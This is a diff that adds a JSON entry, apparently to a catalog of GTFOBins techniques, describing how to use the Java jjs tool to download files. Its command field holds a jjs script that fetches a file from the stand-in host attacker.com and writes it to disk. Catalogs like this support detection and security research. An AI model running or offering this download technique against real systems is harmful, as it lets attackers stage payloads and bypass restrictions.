@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-jjs-download",
+  "name": "GTFOBins · jjs (download)",
+  "command": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://attacker.com/path/to/input-file');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/path/to/output-file');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();",
+  "description": "Use jjs to download via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "jjs",
+    "download"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/jjs/#download",
+  "upstream_id": "jjs/download/0",
+  "category": "gtfobins",
+  "subcategory": "file-download",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/jjs/"
+    }
+  ]
+}
